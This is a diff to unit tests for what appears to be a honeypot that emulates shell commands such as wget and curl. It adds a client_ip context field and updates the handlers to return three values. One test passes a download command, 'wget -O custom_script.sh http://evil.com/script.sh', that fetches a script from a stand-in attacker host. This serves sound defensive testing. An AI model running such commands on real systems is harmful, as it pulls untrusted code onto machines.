@@ -21,6 +21,7 @@ class TestNetworkIntelligence(unittest.TestCase):
             "session_id": "test-session-123",
             "cwd": "/home/test",
             "ip": "1.2.3.4",
+            "client_ip": "1.2.3.4",
             "user": "testuser",
         }
 
@@ -57,7 +58,7 @@ class TestNetworkIntelligence(unittest.TestCase):
         url = "http://evil.com/script.sh"
         cmd = f"wget -O custom_script.sh {url}"
 
-        output, _ = self.handler.handle_wget(cmd, self.context)
+        output, _, _ = self.handler.handle_wget(cmd, self.context)
 
         # Verify File saved in User VFS
         node = self.honey_db.get_user_node(
@@ -73,7 +74,7 @@ class TestNetworkIntelligence(unittest.TestCase):
         url = "http://google.com"
         cmd = f"curl -I {url}"
 
-        output, _ = self.handler.handle_curl(cmd, self.context)
+        output, _, _ = self.handler.handle_curl(cmd, self.context)
 
         self.assertIn("HTTP/1.1 200 OK", output)
 
